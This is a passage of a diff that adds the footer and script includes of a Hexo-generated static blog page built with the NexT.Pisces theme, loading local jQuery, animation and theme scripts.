+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
